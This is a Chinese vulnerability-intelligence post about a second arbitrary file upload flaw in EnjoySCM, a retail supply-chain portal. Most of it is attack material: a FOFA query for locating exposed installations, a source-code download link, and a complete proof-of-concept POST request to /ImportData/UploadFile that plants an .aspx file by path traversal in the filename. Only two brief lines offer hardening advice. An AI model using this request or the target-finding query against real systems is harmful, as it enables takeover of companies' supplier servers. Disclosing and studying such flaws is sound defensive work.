# EnjoySCM UploadFile 任意文件上传漏洞第二处

    \[漏洞情报\] EnjoySCM UploadFile 任意文件上传漏洞第二处
========================================

漏洞标题

EnjoySCM UploadFile 任意文件上传漏洞第二处



漏洞描述

EnjoySCM是一款适应于零售企业的供应链管理软件，主要为零售企业的供应商提供服务。  

EnjoySCM UploadFile 参数存在 任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限。

C

**漏洞细节:**



FOFA:
-----

```null
title="供应商网上服务厅"
```

PoC:
----

前面在某公众号看到的一个漏洞，下载代码稍微看了一下 漏洞有点多 \- -  
源码可以在这里下载：[https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip](https://oss.ywhack.com/%E6%A3%B1%E8%A7%92%E7%A4%BE%E5%8C%BA/coder/SCM40.zip)

```null
POST /ImportData/UploadFile HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
sec-ch-ua-platform: "Windows"
sec-ch-ua: "Google Chrome";v="101", "Chromium";v="101", "Not=A?Brand";v="24"
sec-ch-ua-mobile: ?0
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxwovFKSa
Content-Length: 153

------WebKitFormBoundaryxwovFKSa
Content-Disposition: form-data; name="file";filename="../../../test3.aspx"

test3
------WebKitFormBoundaryxwovFKSa--
```

![](https://forum.ywhack.com/attachments/month_2303/2303062131a3312f6ea80f416e.png)



**加固建议:**

严格限制上传文件类型；  
联系厂商获取加固建议。
